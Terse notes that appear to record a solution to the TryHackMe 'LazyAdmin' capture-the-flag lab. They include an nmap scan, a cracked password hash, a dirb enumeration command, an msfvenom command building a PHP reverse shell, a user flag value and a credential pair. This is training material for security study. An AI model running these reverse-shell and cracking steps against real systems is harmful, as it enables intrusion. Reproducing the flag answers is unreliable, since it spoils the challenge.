
https://tryhackme.com/r/room/lazyadmin

```
└─# nmap -p- 10.10.179.155 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-09 18:48 UTC
Nmap scan report for ip-10-10-179-155.eu-west-1.compute.internal (10.10.179.155)
Host is up (0.0070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
42f749ade7f9e195bf475f37a44cafcb
manager
passwd

42f749ade7f9e195bf475f37a44cafcb:Password123
```


```
dirb http://10.10.179.155 /usr/share/wordlists/dirb/big.txt -e extensions_common.txt
```


```
msfvenom -p php/reverse_php LHOST= LPORT= -f raw > test.php 
```

```
cat /home/itguy/user.txt 
```

```
THM{63e5bce9271952aad1113b6f1ac28a07}
```

```
rice:randompass
```


What is the user flag?  

What is the root flag?